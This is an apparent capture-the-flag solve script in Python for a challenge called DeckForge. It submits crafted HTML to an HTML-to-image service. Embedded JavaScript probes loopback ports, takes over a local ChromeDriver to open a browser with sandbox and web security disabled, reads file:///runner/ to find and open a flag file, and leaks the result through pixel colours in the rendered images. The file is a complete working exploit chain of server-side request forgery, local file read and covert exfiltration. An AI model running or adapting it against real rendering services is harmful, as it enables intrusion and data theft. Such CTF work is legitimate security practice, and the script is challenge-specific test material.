#!/usr/bin/env python3
"""Recover the DeckForge flag through its loopback runner ChromeDriver."""

from __future__ import annotations

import argparse
import io
import json
import statistics
import sys
import time
import urllib.error
import urllib.request
import zipfile
from pathlib import Path

from PIL import Image


ROOT = Path(__file__).resolve().parent
HELPER_PORTS = tuple(range(38560, 38568))
PORT_LEVELS = tuple(32 + 24 * i for i in range(len(HELPER_PORTS)))


def post_pages(target: str, pages: list[str], timeout: int = 60) -> bytes:
    endpoint = target.rstrip("/") + "/html-to-image"
    data = json.dumps({"pages": pages}, separators=(",", ":")).encode()
    request = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.read()
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")
        raise RuntimeError(f"DeckForge returned HTTP {exc.code}: {detail}") from exc


def extract_zip(blob: bytes, destination: Path, name: str) -> list[Path]:
    destination.mkdir(parents=True, exist_ok=True)
    (destination / f"{name}.zip").write_bytes(blob)
    image_dir = destination / name
    image_dir.mkdir(exist_ok=True)
    with zipfile.ZipFile(io.BytesIO(blob)) as archive:
        archive.extractall(image_dir)
    return sorted(image_dir.glob("page_*.jpg"))


def port_probe_page() -> str:
    ports = ",".join(str(port) for port in HELPER_PORTS)
    levels = ",".join(str(level) for level in PORT_LEVELS)
    return f"""<!doctype html><meta charset=utf-8>
<style>html,body{{margin:0;width:100%;height:100%;background:rgb(255,0,0)}}</style>
<script>
(async()=>{{
  const ports=[{ports}], levels=[{levels}];
  const checks=ports.map(async(p)=>{{
    const c=new AbortController(); setTimeout(()=>c.abort(),700);
    try{{
      const r=await fetch('http://127.0.0.1:'+p+'/status',{{signal:c.signal}});
      const j=await r.json(); return !!(r.ok && j.value && j.value.ready);
    }}catch(e){{ return false }}
  }});
  const ready=await Promise.all(checks), i=ready.indexOf(true);
  if(i>=0){{ const v=levels[i]; document.body.style.background=`rgb(${{v}},${{v}},${{v}})` }}
}})();
</script>"""


def median_rgb(image: Image.Image, x: int, y: int, radius: int = 4) -> tuple[int, int, int]:
    rgb = image.convert("RGB")
    channels = [[], [], []]
    for py in range(y - radius, y + radius + 1):
        for px in range(x - radius, x + radius + 1):
            pixel = rgb.getpixel((px, py))
            for channel, value in zip(channels, pixel):
                channel.append(value)
    return tuple(round(statistics.median(values)) for values in channels)


def decode_helper_port(image_path: Path) -> int:
    with Image.open(image_path) as image:
        red, green, blue = median_rgb(image, image.width // 2, image.height // 2)
    if max(red, green, blue) - min(red, green, blue) > 12:
        raise RuntimeError(f"runner helper was not ready (probe RGB={red, green, blue})")
    value = round((red + green + blue) / 3)
    index = min(range(len(PORT_LEVELS)), key=lambda i: abs(PORT_LEVELS[i] - value))
    if abs(PORT_LEVELS[index] - value) > 12:
        raise RuntimeError(f"could not decode helper port (probe RGB={red, green, blue})")
    return HELPER_PORTS[index]


def exploit_pages(port: int) -> list[str]:
    common_style = "body{font:18px monospace;white-space:pre-wrap;overflow-wrap:anywhere}"
    page1 = f"""<!doctype html><meta charset=utf-8><style>{common_style}</style>
<pre>1. launching runner browser on {port}</pre><script>
window.name=JSON.stringify({{port:{port}}});
const caps={{capabilities:{{alwaysMatch:{{browserName:'chrome','goog:chromeOptions':{{
  binary:'/usr/bin/chromium',args:[
    '--headless','--disable-gpu','--single-process','--no-zygote','--no-sandbox',
    '--disable-dev-shm-usage','--disable-web-security','--allow-running-insecure-content',
    '--allow-file-access-from-files','--window-size=1280,720','--no-first-run',
    '--disable-crashpad','--disable-crash-reporter','--remote-debugging-pipe'
  ]
}}}}}}}};
fetch('http://127.0.0.1:{port}/session',{{
  method:'POST',headers:{{'Content-Type':'text/plain'}},body:JSON.stringify(caps),
  keepalive:true,mode:'no-cors'
}}).catch(()=>{{}});
</script>"""

    page2 = """<!doctype html><meta charset=utf-8><style>body{font:24px monospace}</style>
<pre>2. waiting for runner browser initialization</pre>
<script>const until=Date.now()+1800;while(Date.now()<until){}</script>"""

    page3 = f"""<!doctype html><meta charset=utf-8><style>{common_style}</style><pre id=o></pre>
<script>try{{
const x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:{port}/sessions',false);x.send();
const j=JSON.parse(x.responseText),st=JSON.parse(window.name);st.sid=j.value[0].id;
window.name=JSON.stringify(st);o.textContent='3. session '+st.sid;
}}catch(e){{o.textContent='3. ERROR '+e.stack}}</script>"""

    page4 = f"""<!doctype html><meta charset=utf-8><style>{common_style}</style><pre id=o></pre>
<script>try{{
const st=JSON.parse(window.name),x=new XMLHttpRequest();
x.open('POST','http://127.0.0.1:{port}/session/'+st.sid+'/url',false);
x.setRequestHeader('Content-Type','text/plain');x.send(JSON.stringify({{url:'file:///runner/'}}));
o.textContent='4. navigate /runner HTTP '+x.status;
}}catch(e){{o.textContent='4. ERROR '+e.stack}}</script>"""

    page5 = f"""<!doctype html><meta charset=utf-8><style>{common_style}</style><pre id=o></pre>
<script>try{{
const st=JSON.parse(window.name),x=new XMLHttpRequest();
x.open('GET','http://127.0.0.1:{port}/session/'+st.sid+'/source',false);x.send();
const m=x.responseText.match(/flag_[0-9a-f]{{10}}\\.txt/);if(!m)throw Error('flag filename not found');
st.fn=m[0];window.name=JSON.stringify(st);o.textContent='5. found '+st.fn;
}}catch(e){{o.textContent='5. ERROR '+e.stack}}</script>"""

    page6 = f"""<!doctype html><meta charset=utf-8><style>{common_style}</style><pre id=o></pre>
<script>try{{
const st=JSON.parse(window.name),x=new XMLHttpRequest();
x.open('POST','http://127.0.0.1:{port}/session/'+st.sid+'/url',false);
x.setRequestHeader('Content-Type','text/plain');
x.send(JSON.stringify({{url:'file:///runner/'+st.fn}}));o.textContent='6. navigate flag HTTP '+x.status;
}}catch(e){{o.textContent='6. ERROR '+e.stack}}</script>"""

    page7 = f"""<!doctype html><meta charset=utf-8>
<style>{common_style}#bars{{position:absolute;left:8px;top:300px;display:flex;height:200px}}.b{{width:24px;height:200px}}</style>
<h1>7. RECOVERED FLAG</h1><pre id=o></pre><div id=bars></div><script>try{{
const st=JSON.parse(window.name),x=new XMLHttpRequest();
x.open('GET','http://127.0.0.1:{port}/session/'+st.sid+'/source',false);x.send();
const m=x.responseText.match(/BHFlagY\\{{[^}}]+\\}}/);if(!m)throw Error('flag not found');
st.flag=m[0];window.name=JSON.stringify(st);o.textContent=st.flag;
bars.innerHTML=[...st.flag].map(c=>{{const v=c.charCodeAt(0)*2;return '<i class=b style="background:rgb('+v+','+v+','+v+')"></i>'}}).join('');
}}catch(e){{o.textContent='7. ERROR '+e.stack}}</script>"""

    page8 = """<!doctype html><meta charset=utf-8>
<style>body{font:34px monospace;white-space:pre-wrap}#bars{position:absolute;left:8px;top:300px;display:flex;height:200px}.b{width:24px;height:200px}</style>
<h1>8. RECOVERED FLAG</h1><pre id=o></pre><div id=bars></div><script>try{
const st=JSON.parse(window.name);if(!st.flag)throw Error('flag state missing');o.textContent=st.flag;
bars.innerHTML=[...st.flag].map(c=>{const v=c.charCodeAt(0)*2;return '<i class=b style="background:rgb('+v+','+v+','+v+')"></i>'}).join('');
}catch(e){o.textContent='8. ERROR '+e.stack}</script>"""
    return [page1, page2, page3, page4, page5, page6, page7, page8]


def decode_flag(image_path: Path, limit: int = 64) -> str:
    chars: list[str] = []
    with Image.open(image_path) as image:
        for index in range(limit):
            red, green, blue = median_rgb(image, 8 + 24 * index + 12, 380, radius=3)
            value = round((red + green + blue) / 3)
            codepoint = round(value / 2)
            if not 32 <= codepoint <= 126:
                raise RuntimeError(
                    f"invalid barcode value at character {index}: RGB={red, green, blue}"
                )
            chars.append(chr(codepoint))
            if chars[-1] == "}":
                break
    flag = "".join(chars)
    if not (flag.startswith("BHFlagY{") and flag.endswith("}")):
        raise RuntimeError(f"decoded value is not a flag: {flag!r}")
    return flag


def main() -> int:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", default=endpoint["url"])
    parser.add_argument("--work-dir", type=Path, default=ROOT / "output")
    args = parser.parse_args()

    stamp = time.strftime("exploit-%Y%m%d-%H%M%S")
    run_dir = args.work_dir / stamp

    probe_blob = post_pages(args.target, [port_probe_page()], timeout=20)
    probe_images = extract_zip(probe_blob, run_dir, "probe")
    if len(probe_images) != 1:
        raise RuntimeError(f"expected one probe image, got {len(probe_images)}")
    port = decode_helper_port(probe_images[0])

    pages = exploit_pages(port)
    (run_dir / "pages.json").write_text(
        json.dumps({"pages": pages}, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    exploit_blob = post_pages(args.target, pages, timeout=60)
    exploit_images = extract_zip(exploit_blob, run_dir, "result")
    if len(exploit_images) != 8:
        raise RuntimeError(f"expected eight result images, got {len(exploit_images)}")

    flag = decode_flag(exploit_images[-1])
    (run_dir / "result.json").write_text(
        json.dumps({"target": args.target, "helper_port": port, "flag": flag}, indent=2),
        encoding="utf-8",
    )
    sys.stdout.buffer.write(flag.encode("ascii"))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
